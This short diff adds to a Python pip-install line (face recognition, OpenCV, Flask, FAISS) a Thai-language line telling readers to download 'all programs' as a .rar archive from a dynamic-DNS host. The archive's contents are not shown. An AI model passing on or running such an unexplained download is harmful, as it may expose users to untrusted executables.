@@ -1,1 +1,4 @@
 pip install face_recognition opencv-python numpy requests pymysql flask werkzeug mediapipe faiss-cpu
+
+
+โหลด โปรแกรมทุกอย่างที่ https://09472.ddns.net/zz/win-in-3-6-68.rar
